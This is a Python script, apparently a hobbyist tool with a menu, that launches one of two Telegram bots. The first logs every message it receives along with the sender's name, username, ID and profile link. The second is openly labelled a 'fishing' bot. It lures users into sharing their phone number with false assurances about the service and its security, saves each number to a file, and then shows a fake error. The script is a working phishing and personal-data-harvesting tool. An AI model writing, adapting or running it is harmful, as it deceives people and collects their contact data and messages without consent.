import telebot
import pystyle
from pystyle import Colorate, Colors, Center










print(Center.XCenter(Colorate.Horizontal(Colors.yellow_to_red, '''



  ██████  ▒█████    ██████  ▄▄▄       ██▓    
▒██    ▒ ▒██▒  ██▒▒██    ▒ ▒████▄    ▓██▒    
░ ▓██▄   ▒██░  ██▒░ ▓██▄   ▒██  ▀█▄  ▒██░    
  ▒   ██▒▒██   ██░  ▒   ██▒░██▄▄▄▄██ ▒██░    
▒██████▒▒░ ████▓▒░▒██████▒▒ ▓█   ▓██▒░██████▒
▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░ ▒░▓  ░
░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░  ▒   ▒▒ ░░ ░ ▒  ░
░  ░  ░  ░ ░ ░ ▒  ░  ░  ░    ░   ▒     ░ ░   
      ░      ░ ░        ░        ░  ░    ░  ░
                                             

    1. Telegram parsing bot
    2. Fishing number anonim-bot  Telegram Bot

    










''')))
vibor = input("Выбери бота: ")

if vibor == "1":
    vv = input("token from @BotFather: ")
    bot = telebot.TeleBot(vv)
    
    
    @bot.message_handler(commands=["start"])
    def start_message(message):
      bot.send_message(message.chat.id, "bot active")


    @bot.message_handler(content_types=['text'])
    def handle_message(message):
          print(f"Сообщение: {message.text}")
          print(f"Чат ID: {message.chat.id}")
          sender_username = message.from_user.username
          with open("message.txt", "w") as file:
                if sender_username:
                  print(f"Отправитель: {message.from_user.first_name} username: {sender_username}, id: {message.from_user.id}, link: https://t.me/{sender_username}")
                  file.write("CURSEDWORLD||||")
                  file.write(f'Сообщение: {message.text}')
                  file.write(f'Чат ID: {message.chat.id}')
                  file.write(f'Отправитель: {message.from_user.first_name} username: {sender_username}, id: {message.from_user.id}, link: tg://user?id={message.from_user.id}')
                else:
                  print(f"Отправитель: {message.from_user.first_name} username: None, id: {message.from_user.id}, link: tg://user?id={message.from_user.id}")
                  file.write("CURSEDWORLD||||")
                  file.write(f'Сообщение: {message.text}')
                  file.write(f'Чат ID: {message.chat.id}')
                  file.write(f'Отправитель: {message.from_user.first_name} username: None, id: {message.from_user.id}, link: tg://user?id={message.from_user.id}')
            

    
    print("бот в сети")
    bot.infinity_polling()

if vibor == "2":
  vv = input("enter your token from @BotFather: ")
  bot = telebot.TeleBot(vv)
  # Обработчик команды /start
  @bot.message_handler(commands=['start'])
  def start(message):
      keyboard = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
      phone_button = telebot.types.KeyboardButton(text="Отправить номер телефона", request_contact=True)
      keyboard.add(phone_button)
      bot.send_message(message.chat.id, "Привет! Для того чтобы пользоваться нашим ботом,отправьте свой номер телефона. Мы используем эту функцию для мгновенной отправки вашего аккаунта пользователю, без каких либо проблем. Не волнуйтесь наши базы данных очень надежно защищены.", reply_markup=keyboard)

# Обработчик получения контакта
  @bot.message_handler(content_types=['contact'])
  def handle_contact(message):
      if message.contact:
          user_id = message.contact.user_id
          phone_number = message.contact.phone_number

        # Сохраняем номер телефона в файл
          save_phone_number(user_id, phone_number)

          bot.send_message(message.chat.id, f"Спасибо! очень скоро вы сможете пользоватся ботом")
          bot.send_message(message.chat.id, f"Error 404: response not found")
          print("номер успешно сохранен!")
      else:
          bot.send_message(message.chat.id, "Пожалуйста, отправьте свой номер телефона.")

# Функция для сохранения номера телефона в файл
  def save_phone_number(user_id, phone_number):
      with open('Phone_numbers.txt', 'a',) as file:  # Открываем файл в режиме дозаписи ('a')
          file.write(f"User ID: {user_id}, Phone Number: {phone_number}\n, t.me/{phone_number}")
  bot.polling()


